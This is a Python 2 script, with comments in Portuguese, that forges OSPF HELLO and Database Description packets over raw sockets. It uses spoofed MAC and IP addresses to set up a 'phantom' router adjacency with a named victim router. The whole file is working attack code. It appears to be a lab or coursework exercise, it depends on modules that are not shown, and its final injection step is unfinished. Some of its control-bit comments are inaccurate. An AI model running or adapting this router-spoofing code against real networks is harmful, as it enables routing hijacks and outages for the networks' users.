#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import sys

from modules.ip import IP
from modules.ethernet import Ethernet
from modules.ospf import *

# Interface
IF_NAME = 'wlp3s0'

# Identificador do roteador fantasma
PHANTON_ID = '2.2.2.2'
# area configurada no roteador OSPF vitima 
AREA_ID = '3.3.3.3'

# Ip do roteador fantasma
DESIGNATED_ROUTER = '192.168.0.70'
BKP_ROUTER = '0.0.0.0'
# neighbors - roteadores vítimas
VICTIM_ROUTER_IP = '192.168.0.40'

# DB_DESCRIPTION control bits
FIRST_DB = 0x07 # 111
SEND_MORE = 0x03 # 011
NO_MORE = 0x01 #000




def base_package(length):
    #FAKE MACs e FAKE IPs
    ip = IP('192.168.0.66', '224.0.0.0', length)
    ethernet_packet = Ethernet('01:00:5e:00:00:05', 'c2:01:4c:fa:00:00')
    # OSPF em cima de IP, que é em cima de Ethernet
    return ethernet_packet.raw_format() + ip.raw_format() 



def hello_packet(ospf):
    '''
        Montagem do pacote COMPLETO de OSPF HELLO a ser enviado
    '''
    hello_data = ospf.hello_packet('255.255.255.0', DESIGNATED_ROUTER,
                                    BKP_ROUTER, VICTIM_ROUTER_IP)
    return base_package(len(hello_data)) + hello_data



def dbd_description_packet(ospf, control_bits, db_sequence):
    """
        Montagem do pacote COMPLETO do DB DESCRIPTION
    """
    db_description = ospf.db_desc_packet(control_bits, db_sequence)
    return  base_package(len(db_description)) + db_description



def main():
    """
    Main Method
    """
    try:
        s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        s.bind((IF_NAME, 0))
    except socket.error, msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    ospf = OSPF(PHANTON_ID, AREA_ID)

    # ================= Enviando HELLO =================
    s.send(hello_packet(ospf))

    # ================= Enviando DATABASE DESCRIPTION =================
    s.send(dbd_description_packet(ospf, FIRST_DB, 1))
    for i in range (2,11):
        s.send(dbd_description_packet(ospf, SEND_MORE, i))

    s.send(dbd_description_packet(ospf, NO_MORE, 11))
    
    # Vazio, apenas com flag de inicialização, flag de mestre, flag MS(more segments, vai mandar mais segmentos)
    # tem q incluir um nro de sequencia inicial
    #for i in range (0,5):
        # tem q incluir o nro de sequencia, que vai ser o i
    #    db_desc_package = ...
    #    s.send(db_desc_package)

    
    
    
if __name__ == '__main__':
    main()
